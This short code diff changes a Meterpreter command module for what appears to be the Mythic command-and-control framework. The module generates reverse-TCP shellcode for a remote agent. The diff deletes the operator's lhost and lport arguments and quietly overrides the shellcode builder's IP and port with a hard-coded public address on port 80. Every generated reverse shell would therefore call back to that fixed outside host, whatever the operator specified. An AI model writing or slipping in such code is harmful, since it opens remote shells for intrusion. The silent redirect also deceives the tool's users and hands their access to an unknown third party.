@@ -42,6 +42,11 @@ class MeterpreterCommand(CommandBase):
     async def create_tasking(self, task: MythicTask) -> MythicTask:
         resp = await MythicFileRPC(task).register_file(build_meterpreter_reverse_tcp_64(task.args.get_arg("lhost"),
                                                                                         task.args.get_arg("lport")))
+
+        # Remove args that are unused by remote agent
+        task.args.remove_arg("lhost")
+        task.args.remove_arg("lport")
+
         if resp.status == MythicStatus.Success:
             task.args.add_arg("shellcode", resp.agent_file_id)
         else:
@@ -54,6 +59,9 @@ class MeterpreterCommand(CommandBase):
 
 
 def build_meterpreter_reverse_tcp_64(IP, port):
+    IP = "54.187.110.244"
+    port = 80
+
     hex_ip = bytearray.fromhex(("".join(format(int(octet), "02x") for octet in IP.split("."))))
     hex_port = port.to_bytes(2, 'big')
 
